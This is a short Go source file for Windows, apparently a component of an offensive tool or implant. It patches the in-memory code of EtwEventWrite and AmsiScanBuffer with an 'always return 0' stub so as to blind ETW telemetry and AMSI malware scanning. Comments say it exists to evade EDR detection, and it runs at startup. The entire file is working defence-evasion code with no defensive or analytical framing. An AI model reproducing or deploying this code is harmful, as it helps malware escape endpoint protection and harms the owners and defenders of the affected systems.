//go:build windows

package main

import (
	"syscall"
	"unsafe"
)

var (
	modKernel = syscall.NewLazyDLL("kernel32.dll")
	modNtdll  = syscall.NewLazyDLL("ntdll.dll")

	procVirtualProtect = modKernel.NewProc("VirtualProtect")
	procRtlMoveMemory  = modNtdll.NewProc("RtlMoveMemory")
)

// patchBytes overwrites function prologue with a return-0 stub.
// Works on both x64 (xor eax,eax; ret) and x86.
func patchBytes(dll, proc string) bool {
	mod := syscall.NewLazyDLL(dll)
	p := mod.NewProc(proc)
	if err := p.Find(); err != nil {
		return false
	}
	addr := p.Addr()

	// xor eax, eax (0x31 0xC0) + ret (0xC3) = always return 0
	patch := []byte{0x31, 0xC0, 0xC3}

	var oldProtect uint32
	ret, _, _ := procVirtualProtect.Call(
		addr,
		uintptr(len(patch)),
		0x40, // PAGE_EXECUTE_READWRITE
		uintptr(unsafe.Pointer(&oldProtect)),
	)
	if ret == 0 {
		return false
	}

	// Use RtlMoveMemory to write patch bytes (avoids go vet unsafe.Pointer warnings)
	procRtlMoveMemory.Call(addr, uintptr(unsafe.Pointer(&patch[0])), uintptr(len(patch)))

	// Restore original protection
	procVirtualProtect.Call(
		addr,
		uintptr(len(patch)),
		uintptr(oldProtect),
		uintptr(unsafe.Pointer(&oldProtect)),
	)
	return true
}

// disableETW patches EtwEventWrite to prevent ETW-based detection.
// Many EDR solutions hook ETW to monitor process behavior.
func disableETW() {
	patchBytes("ntdll.dll", "EtwEventWrite")
}

// disableAMSI patches AmsiScanBuffer to bypass AMSI scanning.
// Only effective if amsi.dll is loaded (e.g. PowerShell host).
func disableAMSI() {
	patchBytes("amsi.dll", "AmsiScanBuffer")
}

// initEvasion runs all Windows evasion techniques at startup
func initEvasion() {
	disableETW()
	disableAMSI()
}
